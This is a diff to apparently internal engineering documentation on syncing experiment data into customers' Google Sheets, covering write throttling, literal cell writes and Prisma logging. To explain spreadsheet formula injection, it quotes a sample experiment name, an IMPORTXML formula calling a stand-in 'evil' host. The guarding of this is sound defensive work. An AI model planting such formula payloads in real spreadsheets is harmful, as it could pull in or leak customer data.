@@ -804,11 +804,13 @@ that function swallows every error. The throttle is a compare-and-set on
 `WebsiteSheetTarget.refreshedAt`; do not replace it with a read-then-write, or concurrent
 beacons will each fire a write. 
 
-**Sheets rows must be written with `valueInputOption=RAW`.** `USER_ENTERED` parses a leading `=`
-as a formula, and experiment names are customer-controlled text — so a name like
-`=IMPORTXML("http://evil/",…)` would become a live formula in the customer's spreadsheet. There is
-a test asserting a formula-shaped name passes through verbatim; if it fails, read the comment
-beside it before "fixing" it.
+**Sheets text must never be parsed.** The tab is written with one `batchUpdate` `updateCells`
+(values and the title rows' green fill together, one write per refresh), and text goes out as
+`stringValue`, which Google stores literally — the guarantee `valueInputOption=RAW` gives a
+`values.*` call. `USER_ENTERED` or `formulaValue` would turn an experiment named
+`=IMPORTXML("http://evil/",…)` into a live formula in the customer's spreadsheet. Tests assert a
+formula-shaped name passes through verbatim; if one fails, read the comment beside it before
+"fixing" it.
 
 **Prisma logs expected unique violations at error level.** The `sheets_sync_runs` claim table that
 used to produce them is gone, but the partial unique indexes (§6) do the same when a race is lost —
